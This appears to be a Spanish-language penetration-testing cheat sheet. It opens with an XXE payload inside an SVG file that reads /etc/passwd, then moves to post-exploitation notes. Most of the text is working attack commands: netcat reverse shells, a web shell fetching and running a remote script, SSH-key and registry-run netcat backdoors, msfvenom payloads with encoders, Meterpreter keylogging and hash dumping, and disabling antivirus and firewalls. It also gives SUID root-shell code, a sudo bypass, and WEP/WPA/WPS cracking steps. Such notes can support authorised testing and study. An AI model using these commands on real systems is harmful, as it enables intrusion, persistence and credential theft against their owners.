			<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>


#################################################################################################
#################################################################################################
#################################################################################################

Post Explotación

Para escribir sin editor de texto: "cat << EOF > archivoACrear", y escribimos lo que queramos. Finalizar con EOF
Antes de acceder a un fichero, apuntar su timestamp y luego volver a modificarlo con touch

Directorios Apache
	FREEBSD
		/usr/local/etc/apache2x/httpd.conf
		/usr/local/www/apache2x/data

	LINUX
		/etc/apache2/sites-enabled/ Y ver si hay puertos distintos con server web
		/etc/apache2/ports.conf

SAMBA
	/etc/samba

Obtener persistencia

	Si queremos agregar algun usuario a sudoers, visudo y debajo de root ALL=(ALL:ALL) ALL poner lo mismo pero con nombre del usuario
	
	SSH
		ssh-keygen
		mount IP:/ /mnt
		cat .ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys

Transferencia de archivos
	nc -lvp [puerto] > [archivo a guardar]
	nc -vv [ip] [puerto] < [archivo]
	
	mkdir server
	// Poner los archivos en la carpeta
	python -m SimpleHTTPServer 80
	php -s NUESTRAIP para abrir servidor web en local

	curl -s --data "cmd=wget IP-A-LA-SHELL.sh -O /tmp/evil" http://$ip/files/sh.php
	curl -s --data "cmd=chmod 777 /tmp/evil" http://$ip/files/sh.php
	curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php

	printf "GET http://IP/phpshell.php HTTP/1.0\r\n\r\n" > get.txt
	cp phpshell.php /var/www/html
	service apache2 start
	nc IP 80 < get.txt > shell.php // Lo descarga
	
	scp -i claveSSH archivoAPasar user@maquina:PATH

Conectarte a programa y redireccionar salida por nc**
	nc -lvvp [puerto] -e/-c cmd.exe
	nc -v [ip] [puerto]

Obtener shell desde ejecución de comandos
	nc -lvvp [puerto] // En nuestra máquina
	nc -v [ip] [puerto] -e/-c (exec o /bin/sh) /bin/bash

RPC
	Si entramos, con srvinfo obtenemos info sobre el sistema
	Con querydominfo obtenemos más info
	Con enumdomusers enumeramos los usuarios del sistema
		cat salida.txt | cut -d "[" -f 2 | cut -d "]" -f 1 | sort -u > usersRPC.txt
	Con createdomuser [nombre] si tenemos privilegios creamos un usuario
	Con getdompwinfo vemos la complejidad mínima para las contraseñas
	Con chgpasswd2 [username] [old pass] [new pass] cambiamos la contraseña
	Con lsaquery (en teoría) obtenemos el nombre de dominio

TOMCAT
	En caso de que accedamos al manager => msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
	O también => use exploit/multi/http/tomcat_mgr_deploy

FTP
	Descargar todo de ftp => wget -m --no-passive ftp://anonymous:anonymous@IP

WEB
	Al acceder a shell desde web, buscar credenciales de acceso en archivos de configuración php

MSSQL
	Cliente MSSQL
		wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
		python mssqlclient.py -port 1433 -db BBDD USER:'PASS'@IP [-windows-auth]
	SELECT @@version
	SELECT HOST_NAME()
	select @@servername
	SELECT name FROM master..syslogins // Enum users
	SELECT name FROM master..sysdatabases; // Enum dbs
	SELECT DB_NAME()
	use DB
	select distinct table_name from information_schema.tables
	EXEC sp_addlogin 'user', 'pass';
	EXEC xp_cmdshell 'net user'; -- privOn
	SELECT NAME FROM sys.objects WHERE TYPE='U' // Sacar todas las tablas de una base de datos, más rápido que con sqlmap a pelo, requiere de sql-shell

	use auxiliary/admin/mssql/mssql_enum
	use exploit/windows/mssql/mssql_payload
		set PAYLOAD windows/meterpreter/reverse_tcp

	use auxiliary/admin/mssql/mssql_exec
	set CMD net user pwned pass000 /ADD
	net localgroup administrators pwned /ADD

MySQL
	mysql -uUSER -pPASS -e "QUERY"
	
	echo "show databases;" | mysql -uroot -pPASSWORD
	Show all databases in mysql.

	echo "use dvwa; show tables;" | mysql -uroot -pPASSWORD
	Show all tables in the dvwa database.

	echo "use dvwa; desc users;" | mysql -uroot -pPASSWORD
	Describe the fields of the dvwa.users table.

	echo "select * from dvwa.users;" | mysql -uroot -pPASSWORD
	Print the contents of the dvwa.users table.
	Notice the password field is displayed, where you can use tools like John the Ripper to crack it.
	
	GRANT ALL PRIVILEGES ON *.* TO 'NUESTROUSER'@'NUESTRAIP' // Para permitirnos conectarnos desde nuestra máquina a MySQL cuando sale Unauthorized
	mysql -h IPMAQUINA -u root

	select sys_exec('chown USER:USER /etc/sudoers');
	chmod 0751 /etc/sudoers
	chmod 0440 /etc/sudoers
	select sys_exec('chown root:root /etc/sudoers');
	O también select sys_eval('usermod -a -G admin USER');
	
	SELECT load_file('/etc/passwd');

POSTGRESQL
	Usuario por defecto: postgres
	Pueerto: 5432
	BBDD defecto: postgres

WINDOWS
	net config Workstation // Obtener info del equipo
	net user // Obtener usuarios
	ipconfig /all
	ipconfig /displaydns
	route print Ó netstat -r // Tabla de rutas
	arp -a
	netstat -ano // Conexiones activas
	tasklist /svc // Lista procesos activos
	net start // Lista servicios iniciados
	net start/stop PROCESO // Inicia o para un servicio
	netsh firewall show state // Ver estado del Firewall
	netsh firewall show config
	netsh firewall set opmode disable (con privilegios)
	net localgroup
	net user \domain (Para ver los usuarios de un dominio)
	Descargar archivos desde Windows
		certutil.exe -urlcache -split -f http://IP:PUERTO/shell.ps shell.ps
		powershell (New-Object Net.WebClient).DownloadFile('http://IP:PUERTO/archivo', 'archivodestino')
	Ver permisos de una carpeta
		icacls FOLDER

	use post/windows/gather/enum_patches

	https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

LINUX
	last (historial de inicios de sesión)
	whoami
	uname -a
	more .bash_history
	cat /proc/version
	cat /etc/hosts
	cat /etc/group
	cat /etc/resolv.conf
	ps -xaf // Enumerar procesos en ejecución
	service --status-all
	grep -vE "nologin|false" /etc/passwd // Obtener usuarios que pueden hacer login en la máquina
	find / -name ".mysql_history" // Buscar .mysql_history history
	use post/multi/gather/tomcat_gather // Credenciales de Tomcat

	searchsploit versionKernel
	searchsploit -x nombreExploit.txt para ver el exploit
	searchsploit -m numExploit

	**Elevación de privilegios**
	sudo su // Probar si el usuario tiene permisos de root
	sudo -l Para ver si el usuario puede ejecutar algo como root
	find / -perm -4000 -ls 2> /dev/null // Para buscar ficheros con SUID activado
		https://gtfobins.github.io/
	To see every process running as root (real & effective ID) in user format:
		  ps -U root -u root u
	wget https://highon.coffee/downloads/linux-local-enum.sh // Enumeración de posibles aspectos para elevar privilegios
	wget https://www.securitysift.com/download/linuxprivchecker.py // Enumeración y posibles exploits
	[--no-check-certificate]

	find . -exec /bin/sh \; // Si find tiene SUID activado

	nmap -iL FICHERO-A-LEER localhost
	nmap --interactive
	!sh
	// Si nmap tiene SUID

	----------------------------------------
	Si la versión de chkrootkit es vulnerable (/etc/chkrootkit/chkrootkit -V == 0.49) =>
		cat << EOF > rootme.c
		> int main(void)
		> {
		>     setgid(0);
		>     setuid(0);
		>     execl("/bin/sh", "sh", 0);
		> }
		> EOF
	Compilamos y guardamos en /tmp

	Y luego en /tmp creamos el archivo update que se ejecutará como root
		cat << EOF > update
		> #!/bin/bash
		> chown root /tmp/rootme ; chgrp root /tmp/rootme ; chmod u+s /tmp/rootme
		> EOF

	Finalmente ejecutamos rootme y obtenemos shell root
	----------------------------------------
	Con NFS no_root_squash ->

	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>

	int main() {

		setuid(0);
		setgid(0);
		system("/bin/bash");
		return 0;
	}

	#include <sys/types.h>
	#include <unistd.h>

	int main() {

	setuid(0);
	setgid(0);
	system("/bin/sh");
	return 0;

	}

	Ponerle propietario root y SUID desde nuestro terminal, no la shell
	chown root:root archivo
	chmod 4777 archivo
	Ejecutarlo
	----------------------------------------

	Elevar privs vuln de sudo
	sudo -u#-1 COMANDO -u //// sudo -u#4294967295 COMANDO -u

METASPLOIT
	Meterpreter
	use incognito
	Después list_tokens -u
	impersonate_token NOMBRE_TOKEN (Añadiendo doble barra cuando haya una barra \ -> \\
	getpid
	search -d /directorio -f *config*
	Si estamos utilizando meterpreter en un servicio que el usuario puede cerrar, cambiar a otro proceso con migrate PID
	run post/windows/manage/migrate => Migrar de proceso para seguir en el sistema
	Para capturar lo que escriba el usuario mejor estar en explorer.exe, y si queremos capturar las credenciales sin crackearlas, winlogon.exe. Cerrar con Ctrl+C
	run killav Para parar antivirus
	run persistence -X -i ITERACIONES_ENCODER -p PUERTO -r NUESTRA IP => Para tener persistencia en el sistema
	Para descargar archivos, "download [archivo]" y para subirlos, "upload [archivo]", pudiendo seleccionar la ruta con "upload [archivo] [ruta de destino (teniendo en cuenta que sería del estilo C:\\windows\\system32\\)]"
	Para ganar los máximos privilegios posibles, "getprivs"
	Comando "search" para listar archivos, buscando con "*.doc" o cualquier extensión
	"sysinfo" para info
	"idletime" para ver cuánto tiempo lleva encendido el target
	"screenshot" para captura de pantalla
	"uictl [enable/disable] [keyboard/mouse]" habilita o deshabilita teclado y/o ratón
	sysinfo
	screenshot
	Para habilitar el keylogger -> keyscan_start y para obtener lo escrito keyscan_dump
	Para recolectar todos los hashes y tokens de la máquina víctima "run credcollector" dentro de meterpreter, o "hashdump" para obtener los hashes
	Después ponemos la sesión en background y utilizamos "use post/windows/gather/hashdump" y hacemos "set [sesión que tenemos corriendo]" y run
	Finalmente lanzamos use auxiliary/analyze/jtr_crack_fast y run para crackearlos. SI SALE ALGÚN ERROR EN EL MÓDULO HAY QUE COMENTAR LA LÍNEA 110
	También podemos cargar mimikatz con load mimikatz utilizar mimikatz_command -f samdump::hashes, y luego wdigest
	getsystem
	run post/windows/escalate/bypassuac Y luego getsystem
	Backdoor:
	    Desactivar firewall
	    kill av => Puede que no esté el nombre, así que habría que hacerlo a mano con el PID
	    upload pentest/windows-binaries/tools/nc.exe C:\\Windows\\
	    reg setval -k HKLM \\software\\microsoft\\windows\\currentversion\\run -c 'C:\RUTA_DE_NC -Ldp 4444 -c cmd.exe' -v netcat (o un nombre más discreto)
	    Conectarse con nc -v IP PUERTO

	    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 (o las que queramos) LHOST = IP_LOCAL LPORT = PUERTO_LOCAL -f exe > backdoor.exe
	    Lo subimos con upload
	    Y hacemos los mismo que con nc para hacerlo persistente

	msfvenom -l (lista payloads disponibles)
	msfvenom -p [PAYLOAD] LHOST=[Nuestra IP] LPORT=[Puerto de escucha] -f raw > [archivo donde se creará]
		ejemplo -> php/meterpreter /reverse_tcp
	msfvenom -p [PAYLOAD] -e [encoder (recomendado shikata_ga_nai)] -i [número de iteraciones que se aplica el encoder] LHOST=[IP Local] LPORT=[Puerto local] -f [formato del payload]
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.32 LPORT=2222 -f exe > shell2.exe

	Tras subir payload a máquina víctima, ponemos Metasploit con "use multi/handler" y seleccionamos "set payload [el que hayamos usado]" y "set LHOST [nuestra IP]" y "set LPORT [el puerto elegido]" y seleccionamos "exploit"
	Para salir de un meterpreter sin cerrarlo, "background", y para listar sesiones activas "sessions -l"
	Para retomar una sesión en background, "sessions -i [número en la lista]"
	Para cerrar una sesion en background, "sessions -k [número en la lista]"

	Para modificar el registro y hacer que netcat (nc.exe que hemos subido a C:\windows\system32) se ejecute al arranque usamos reg enumkey -k [regkey a editar (en este caso HKLM\\software\\microsoft\\windows\\currentversion\\run)] y definimos que esa es la regkey a modificar
		Definimos los valores con reg setval -k [regkey a editar (en este caso HKLM\\software\\microsoft\\windows\\currentversion\\run)] -v [nombre (en este caso nc)] -d '[ruta del archivo (C:\windows\system32\nc.exe)] -Ldp [puerto de escucha] -e [qué autoejecutará nc (cmd.exe)]' (Nótesen las comillas simples para los parámetros del nc)
		Nos aseguramos que la regkey tiene esos valores con reg queryval -k [ruta de la regkey] -v [nombre (en este caso nc)]

	Para modificar las reglas del Firewall y permitir el tráfico por el puerto elegido:
		Con netsh firewall show opmode vemos el estado del Firewall
		netsh firewall add portopening [Protocolo (en este caso TCP)] [Puerto a abrir] "Service Firewall" ENABLE ALL

#################################################################################################
#################################################################################################
#################################################################################################

Wireless

https://github.com/v1s1t0r1sh3r3/airgeddon

WEP ->
Suite Aircrack-ng usando Airmon-ng, Airodump-ng, Aireplay-ng y Aircrack-ng
Wifite (Script automatizado)

airmon-ng start [interfaz]
airodump-ng [interfaz en monitor]
airodump-ng -c [canal del AP] --bssid [bssid del AP] -w [fichero al que se va a escribir la captura .cap] [interfaz en monitor]
aireplay-ng -9 (comprueba la inyección)
aireplay-ng -1 (fakeauth) 0 (tiempo entre cada fakeauth) -e [essid del AP] -a [bssid del AP] -h [mac con la que queremos asociarnos al AP (si es una que sabemos que acepta el AP mejor) [interfaz en monitor]
aireplay-ng -3 (captura y reenvía las peticiones arp) -x [velocidad de inyección] -b [bssid del AP] -h [mac que queremos usar] [interfaz en monitor]
aircrack-ng -z [archivo .cap]


Ataque chop-chop
1. airmon-ng start <interfaz de red>
2. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
3. aireplay-ng -1 <tiempo entre cada asociación> -e <ESSID del AP> -a <BSSID del AP> -h <nuestra mac> <interfaz>
4. aireplay-ng -4 -b <BSSID del AP> -h <nuestra MAC> <interfaz>
5. tcpdump -s 0 -n -e -r <archivo .cap generado antes> HAY QUE FIJARSE EN LA IP QUE APARECE PARA USARLA LUEGO
6. packetforge-ng -0 -a <BSSID del AP> -h <nuestra MAC> -k <ip dentro del rango> -l <ip obtenida antes> -y <archivo .xor obtenido antes> -w <archivo a reinyectar>
7. aireplay-ng -2 -h <nuestra MAC> -r <archivo creado en el paso anterior> <interfaz>
8. aircrack-ng <archivo de captura .cap>


Ataque fragmentación
1. airmon-ng start <interfaz de red>
2. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
3. aireplay-ng -1 <tiempo entre cada asociación> -e <ESSID del AP> -a <BSSID del AP> -h <nuestra mac> <interfaz>
4. aireplay-ng -5 -b <BSSID del AP> -h <nuestra MAC> <interfaz>
5. packetforge-ng -0 -a <BSSID del AP> -h <nuestra MAC> -k <ip dentro del rango> -l <ip obtenida antes> -y <archivo .xor obtenido antes> -w <archivo a reinyectar>
6. aireplay-ng -2 -h <nuestra MAC> -r <archivo creado en el paso anterior> <interfaz>
7. aircrack-ng <archivo de captura .cap>


Ataque Hirte (Requiere de un cliente conectado al AP)
1. airmon-ng start <interfaz de red>
2. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
3. airbase-ng -c <canal de AP objetivo> -e <ESSID del punto de acceso objetivo> -N -W 1 <interfaz>
4. aircrack-ng <archivo de captura .cap>


Ataque Caffe Latte (Requiere de un cliente conectado al AP)
1. airmon-ng start <interfaz de red>
2. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
3. airbase-ng -c <canal de AP objetivo> -e <ESSID del punto de acceso objetivo> -L -W 1 <interfaz>
4. aircrack-ng <archivo de captura .cap>


Ataque a WPA
1. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
2. aireplay-ng -0 <paquetes a mandar al cliente objetivo> -a <mac del punto de acceso> -c <mac del cliente asociado al punto de acceso> <interfaz>
3. aircrack-ng <archivo de captura .cap> (Para comprobar que está el handshake)


WPS ->
  Reaver -----> reaver -i [interfaz inalámbrica] -b [bssid del AP] -vv (añaden también -K 1, probar más parámetros)
	Wifite (Script automatizado)

	python pyxiewps-ES.py -p (Una vez que captura la información con Reaver intenta sacar el pin WPS del router) -a [Tiempo para enumerar APs con WPS] -t [Tiempo para recolectar info del AP] -c [Canal a usar] -P (Si se encuentra mas de un AP con WPS, preguntar a cual se quiere atacar. Si el pin WPS ya fue conseguido pregunta para atacar de nuevo) -o [Archivo de salida para datos] -f (Si se tiene éxito al averiguar el pin WPS, también tratar de averiguar la clave WPA)

		python pyxiewps-ES.py -p -P -a 20 -t 180 -o prueba.txt -f

WPA ->
  https://www.cloudcracker.com/ (Necesario capturar handshake para subirlo)

airmon-ng start [interfaz]
airodump-ng [interfaz en monitor]
airodump-ng -c [canal del AP] --bssid [bssid del AP] -w [fichero al que se va a escribir la captura .cap] [interfaz en monitor]
Si hay algún cliente conectado, lo desautenticamos
aireplay-ng -0 (desautenticar) 1 (veces que se mandará la desautenticación) -a [bssid del AP] -c [mac del cliente a desautenticar] [interfaz en monitor]
aircrack-ng –w [diccionario] [archivo .cap]

WPS
wash -i wlan0mon -C
reaver -i wlan0mon -b BSSID-ANTERIOR -vv


Cracking WPA
hashcat -m 2500 CAPTURE-FILE DICC

Gerix Wifi Cracker (GUI)
git clone https://github.com/J4r3tt/gerix-wifi-cracker-2.git
python gerix.py
